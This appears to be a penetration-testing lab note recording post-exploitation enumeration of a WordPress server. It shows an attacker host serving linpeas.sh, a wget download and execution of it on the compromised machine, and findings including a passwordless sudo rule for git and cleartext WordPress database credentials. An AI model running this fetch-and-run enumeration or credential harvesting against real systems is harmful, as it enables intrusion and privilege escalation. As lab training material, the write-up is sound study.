
## Important things to search:

1. System information
2. Network interfaces
3. Sudo commands 
4. WordPress database connection settings
5. Git repository in the WordPress directory

## Location in my machine
```
cp /usr/share/peass/linpeas/linpeas.sh .
```

Serving
```
┌──(kali㉿kali)-[~/AssemblingthePieces/beyond/websrv1]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Downloading linpeas and make it executable
```
daniela@websrv1:~$ wget http://192.168.119.5/linpeas.sh
--2022-09-30 12:26:55--  http://192.168.119.5/linpeas.sh                                                                        
Connecting to 192.168.119.5:80... connected.                                                                                    
HTTP request sent, awaiting response... 200 OK                                                                                  
Length: 826127 (807K) [text/x-sh]                                                                                               
Saving to: ‘linpeas.sh’      

linpeas.sh  100%[============================>] 806.76K   662KB/s    in 1.2s     

2022-09-30 12:26:56 (662 KB/s) - ‘linpeas.sh’ saved [826127/826127] 


daniela@websrv1:~$ chmod a+x ./linpeas.sh
```

Starting the local enumeration with linpeas
```
daniela@websrv1:~$ ./linpeas.sh
```

### Things found:
System information
```
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                           
Linux version 5.15.0-48-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #54-Ubuntu SMP Fri Aug 26 13:26:29 UTC 2022                           
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.1 LTS
Release:        22.04
Codename:       jammy
```

Network interfaces
```
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                          
link-local 169.254.0.0
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:26:5d brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 192.168.50.244/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:265d/64 scope link 
       valid_lft forever preferred_lft forever
```

Sudo commands for daniela
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                             
Matching Defaults entries for daniela on websrv1:                                                                                                                                                            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User daniela may run the following commands on websrv1:
    (ALL) NOPASSWD: /usr/bin/git
```

WordPress database connection settings
```
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2495 Sep 27 11:31 /srv/www/wordpress/wp-config.php                                                                                                                          
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'DanielKeyboard3311' );
define( 'DB_HOST', 'localhost' );
```

Git repository in the WordPress directory
```
╔══════════╣ Analyzing Github Files (limit 70)
                                                                                                                                
drwxr----- 8 root root 4096 Sep 27 14:26 /srv/www/wordpress/.git
```

